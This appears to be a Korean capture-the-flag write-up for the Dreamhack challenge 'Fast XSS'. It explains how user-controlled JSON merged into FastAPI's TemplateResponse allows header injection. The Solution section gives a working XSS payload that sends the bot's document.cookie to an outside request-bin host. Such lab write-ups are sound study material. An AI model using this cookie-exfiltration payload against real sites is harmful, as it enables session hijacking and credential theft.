# Fast XSS
## Overview
```
version: "3"
services:
  web:
    build: ./deploy/web
    restart: unless-stopped
    ports:
      - 8000:8000
  bot:
    build: ./deploy/bot
    restart: unless-stopped
    ports:
      - 1337:1337
    environment:
      - FLAG=DH{FLAG}
```
fastapi 서버가 8000 포트로, express 서버가 1337 포트로 돌아가고 있다.

`./deploy/web/app.py:`
```py
@app.get("/")
async def index(request: Request, data: str = '{"context": {"user": "Guest"}}'):
    try:
        data = json.loads(data)
    except:
        data = {"context": {"user": "Guest"}}
    context = {"name": "index.html", "request": request}|data
    return templates.TemplateResponse(**context)
```
사용자가 `data`를 조작할 수 있기 때문에 `context = {"name": "index.html", "request": request}|data`에서 context dictionary의 값을 조작할 수 있다.
조작할 수 있는 값들은 아래의 TemplateResponse 정의를 확인하였다.
```
TemplateResponse(
    request: Request,
    name: str,
    context: Optional[Dict[str, Any]] = None,
    status_code: int = 200,
    headers: Optional[Mapping[str, str]] = None,
    media_type: Optional[str] = None,
    background: Optional[BackgroundTask] = None,
) -> _TemplateResponse
```
name은 파일이 index.html밖에 존재하지 않기 때문에 제외했고, headers를 통해 header injection이 가능해 보였다.

`./deploy/bot/bot.mjs:`
```js
  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(APP_URL + path);
    await sleep(5 * 1000);
    await page.close();
  } catch (e) {
    console.error(e);
  }
```
cookie에 flag를 설정하고 사용자에게 입력받은 path를 이용해 web 컨테이너 페이지로 이동한다.
해당 path 값을 문제의 제목처럼 XSS payload로 구성하여 쿠키 값을 얻어내면 될 것 같았다.

## Solution
web 컨테이너에서 data 인자의 header injection을 통해 XSS 공격을 진행할 수 있다:
```
http://127.0.0.1:8000/?data={%22headers%22:%20{%22\n%3Ch1%3Einjected%3C/h1%3Etest%22:%20%22%22}}
```
`This will show:`
![](https://dreamhack-media.s3.amazonaws.com/attachments/cddc2d98754fbd627171eda9f26c8568781018eeb27be1b6fea570638b580ab4.png)

CSP가 따로 적용되어 있지 않기 때문에 javascript payload를 바로 전송하면 되고,
bot 컨테이너에서 web 컨테이너로 XSS 공격을 진행하여 bot 컨테이너에서 XSS 공격을 통해 cookie 값을 공격자 서버로 전송하면 된다:
```
{"headers": {"\n<script>location.replace('https://en0p6pk0whwo3e.x.pipedream.net/?cookie=test'.replace('test', document.cookie))</script>": ""}}
```
![](https://dreamhack-media.s3.amazonaws.com/attachments/9d8a133f921218a227a02193fb6f274814bd0c5b6353deb722e3e678f184e56a.png)